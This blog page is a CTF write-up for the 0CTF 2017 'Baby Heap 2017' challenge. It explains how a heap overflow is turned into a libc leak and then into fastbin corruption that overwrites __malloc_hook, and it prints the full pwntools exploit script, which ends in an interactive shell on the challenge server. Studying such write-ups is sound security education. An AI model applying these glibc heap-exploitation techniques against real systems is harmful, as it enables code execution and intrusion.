<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>0CTF 2017 Quals: Baby Heap 2017 (pwn 255) | Isaac's Blog</title><link rel="canonical" href="https://poning.me/2017/03/24/baby-heap-2017/"/><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/very-simple.css"><link rel="stylesheet" type="text/css" href="/css/solarized-dark.css"><link rel="stylesheet" type="text/css" href="/css/my.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><!-- include the sidebar--><!-- include ./includes/sidebar.jade--><!-- Blog title and subtitle--><header><div class="container header"><a id="logo" href="/." class="title">Isaac's Blog</a><span class="subtitle">The force is with those who read the source.</span><label id="toggle-menu" for="menu" onclick><i class="fa fa-bars"></i></label></div></header><!-- use checkbox hack for toggle nav-bar on small screens--><input id="menu" type="checkbox"><!-- Navigation Links--><nav id="nav"><div class="container"><a href="/" class="sidebar-nav-item active">Home</a><a href="/archives/" class="sidebar-nav-item">Archives</a><a href="/about/" class="sidebar-nav-item">About</a></div></nav><div id="header-margin-bar"></div><!-- gallery that comes before the header--><div class="wrapper"><div class="container post-header"><h1>0CTF 2017 Quals: Baby Heap 2017 (pwn 255)</h1></div></div><div class="wrapper"><div class="container meta"><div class="post-time">2017-03-24</div><div class="post-categories"><a class="post-category-link" href="/categories/writeup/">writeup</a></div><div class="post-tags"><a class="post-tag-link" href="/tags/fastbin-corruption/">fastbin corruption</a>/<a class="post-tag-link" href="/tags/heap/">heap</a>/<a class="post-tag-link" href="/tags/overlapping-chunks/">overlapping chunks</a>/<a class="post-tag-link" href="/tags/pwn/">pwn</a></div></div></div><article><div class="container post"><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>Let’s practice some basic <a href="/2017/03/24/baby-heap-2017/babyheap_69a42acd160ab67a68047ca3f9c390b9" title="heap">heap</a> techniques in 2017 together!<br>202.120.7.218:2017<br><a href="/2017/03/24/baby-heap-2017/libc.so.6_b86ec517ee44b2d6c03096e0518c72a1" title="libc.so.6">libc.so.6</a></p>
</blockquote>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>Overlapping two chunks to leak the address of the libc.</li>
<li>Use fastbin corruption to override the value of <code>__malloc_hook</code> to one-gadget.</li>
</ul>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight plain"><table><tr><td class="code"><pre>===== Baby Heap in 2017 =====<br>1. Allocate<br>2. Fill<br>3. Free<br>4. Dump<br>5. Exit<br>Command:<br></pre></td></tr></table></figure>
<p>This is a classical pwn challenge of heap with four kinds of operations: <code>malloc</code>, <code>free</code>, read, write. The only difference is that it use <code>calloc</code>, which initialzes the memory to zero, instead of the usual <code>malloc</code>. The challenge further increases its difficulty in two ways. First, it enables PIE and put the array of the <code>malloc</code> pointers in a random <code>mmap</code> area. Therefore, we do not know the address to launch the “unsafe unlink” attack. Second, it also enables RELRO so that we cannot change the value of GOT table to hijack the control flow. In contrast, the vulnerability is evident. We can fill the arbitrary length of input to the heap and overflow anything after that.</p>
<p>To solve this challenge, I first leak the address of the libc by overlapping two chunks as follows (also a common attack).</p>
<img src="/2017/03/24/baby-heap-2017/baby_heap_2017.png" alt="baby_heap_2017.png" title="">
<p>Then, I override the <code>fd</code> pointer of a freed fastbin chunk to somewhere before <code>__malloc_hook</code> which has a valid “chunk size.” Finally, after two <code>malloc</code> of the proper size, I get a chunk which allows me to change the <code>__malloc_hook</code> to one-gadget.</p>
<p>Note that the checking of the chunk size of the fastbin in <code>malloc.c</code> is not strict. It only checks whether the size divided by 16 (64bit) equals to the same index. There is no requirement of alignment, and it views the size as a 4-byte integer. Therefore, in this challenge, I took <code>0x7f</code> as the chunk size of a <code>0x70</code> fastbin chunk.</p>
<figure class="highlight c"><figcaption><span>malloc.c</span></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br></pre></td><td class="code"><pre><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin_index(sz) \<br>  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br>...<br><span class="hljs-keyword">if</span> (<span class="hljs-number">__b</span>uiltin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>  &#123;<br>    errstr = <span class="hljs-string">"malloc(): memory corruption (fast)"</span>;<br></pre></td></tr></table></figure>
<p>The full script is as follows.<br><figure class="highlight python"><figcaption><span>babyheap_exp.py</span><a href="/2017/03/24/baby-heap-2017/babyheap_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.terminal = [<span class="hljs-string">'tmux'</span>, <span class="hljs-string">'splitw'</span>, <span class="hljs-string">'-h'</span>]<br>context.arch = <span class="hljs-string">'x86_64'</span><br><br>libc = ELF(<span class="hljs-string">'./libc.so.6_b86ec517ee44b2d6c03096e0518c72a1'</span>)<br>libc.symbols[<span class="hljs-string">'one_gadget'</span>] = <span class="hljs-number">0x41374</span><br>bin_offset = <span class="hljs-number">0x3a5678</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span><span class="hljs-params">(size)</span>:</span><br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Command: '</span>)<br>    r.sendline(<span class="hljs-string">'1'</span>)<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Size: '</span>)<br>    r.sendline(str(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span><span class="hljs-params">(index, content)</span>:</span><br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Command: '</span>)<br>    r.sendline(<span class="hljs-string">'2'</span>)<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Index: '</span>)<br>    r.sendline(str(index))<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Size: '</span>)<br>    r.sendline(str(len(content)))<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Content: '</span>)<br>    r.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(index)</span>:</span><br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Command: '</span>)<br>    r.sendline(<span class="hljs-string">'3'</span>)<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Index: '</span>)<br>    r.sendline(str(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span><span class="hljs-params">(index)</span>:</span><br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Command: '</span>)<br>    r.sendline(<span class="hljs-string">'4'</span>)<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Index: '</span>)<br>    r.sendline(str(index))<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Content: \n'</span>)<br>    data = r.recvline()<br>    <span class="hljs-keyword">print</span> data<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-comment"># r = process(</span><br>    <span class="hljs-comment"># './babyheap_69a42acd160ab67a68047ca3f9c390b9',</span><br>    <span class="hljs-comment"># env={ 'LD_PRELOAD': './libc.so.6_b86ec517ee44b2d6c03096e0518c72a1' }</span><br><span class="hljs-comment"># )</span><br><span class="hljs-comment"># gdb.attach(r, '''</span><br><span class="hljs-comment"># c</span><br><span class="hljs-comment"># ''')</span><br>r = remote(<span class="hljs-string">'202.120.7.218'</span>, <span class="hljs-number">2017</span>)<br><br><span class="hljs-comment"># create overlapping chunks by shrinking a free chunk's size</span><br>allocate(<span class="hljs-number">16</span>) <span class="hljs-comment">#0</span><br>allocate(<span class="hljs-number">480</span>) <span class="hljs-comment">#1</span><br>allocate(<span class="hljs-number">512</span>) <span class="hljs-comment">#2</span><br>allocate(<span class="hljs-number">512</span>) <span class="hljs-comment">#3</span><br>free(<span class="hljs-number">1</span>)<br>fill(<span class="hljs-number">0</span>, flat(<span class="hljs-string">'A'</span>*<span class="hljs-number">24</span>, <span class="hljs-string">'\x30'</span>)) <span class="hljs-comment"># shrink the chunk</span><br>allocate(<span class="hljs-number">128</span>) <span class="hljs-comment">#1</span><br>allocate(<span class="hljs-number">96</span>) <span class="hljs-comment">#4</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># overlap the header of the remainder chunk with the forgetten chunk to</span><br><span class="hljs-comment"># leak the address of libc</span><br>allocate(<span class="hljs-number">128</span>) <span class="hljs-comment">#1</span><br>data = dump(<span class="hljs-number">4</span>)<br>bin_address = u64(data[:<span class="hljs-number">8</span>])<br>log.critical(hex(bin_address))<br>libc.address = bin_address - bin_offset<br>log.critical(hex(libc.address))<br><br><span class="hljs-comment"># fastbin corruption</span><br><span class="hljs-comment"># get a chunk just before __malloc_hook in the second allocation</span><br>fill(<span class="hljs-number">1</span>, flat(<span class="hljs-string">'B'</span>*<span class="hljs-number">0x80</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x70</span>)) <span class="hljs-comment"># fix chunk meta data</span><br>free(<span class="hljs-number">4</span>)<br>fill(<span class="hljs-number">1</span>, flat(<span class="hljs-string">'B'</span>*<span class="hljs-number">0x80</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x70</span>, libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]<span class="hljs-number">-0x23</span>)) <span class="hljs-comment"># override fd</span><br>allocate(<span class="hljs-number">96</span>) <span class="hljs-comment">#2</span><br>allocate(<span class="hljs-number">96</span>) <span class="hljs-comment">#4</span><br>fill(<span class="hljs-number">4</span>, flat(<span class="hljs-string">'\x00'</span>*<span class="hljs-number">19</span>, libc.symbols[<span class="hljs-string">'one_gadget'</span>]))<br><br><span class="hljs-comment"># trigger __malloc_hook</span><br>allocate(<span class="hljs-number">96</span>)<br><br>r.interactive()<br></pre></td></tr></table></figure></p>
<blockquote>
<p>Flag: <code>flag{you_are_now_a_qualified_heap_beginner_in_2017}</code></p>
</blockquote>
</div><!-- comment system--><div class="container"><hr><div id="disqus_thread"></div><script type="text/javascript">
var disqus_shortname = 'poning';
var disqus_identifier = '2017/03/24/baby-heap-2017/';
var disqus_title = '0CTF 2017 Quals: Baby Heap 2017 (pwn 255)';
var disqus_url = 'https://poning.me/2017/03/24/baby-heap-2017/';
(function() {
   var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
   dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
   (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">Blog comments powered by <span class="logo-disqus">Disqus</span></a></div></article><footer id="footer"><div class="container"><div class="bar"><div class="social"><a href="mailto:i@poning.me" target="_blank"><i class="fa fa-envelope-o"></i></a><a href="https://github.com/Isaac0616" target="_blank"><i class="fa fa-github"></i></a><a href="/atom.xml" target="_blank"><i class="fa fa-rss"></i></a></div><div class="footer">© 2017 <a href="/" rel="nofollow">Isaac Tseng</a>. Powered by <a rel="nofollow" target="_blank" href="https://hexo.io">Hexo</a>. Theme <a target="_blank" href="https://github.com/lotabout/very-simple">very-simple</a>.</div></div></div></footer><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
    $(".fancybox").fancybox();
});
</script></body><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
e=o.createElement(i);r=o.getElementsByTagName(i)[0];
e.src='//www.google-analytics.com/analytics.js';
r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
ga('create','UA-86477289-1');ga('send','pageview');</script></html>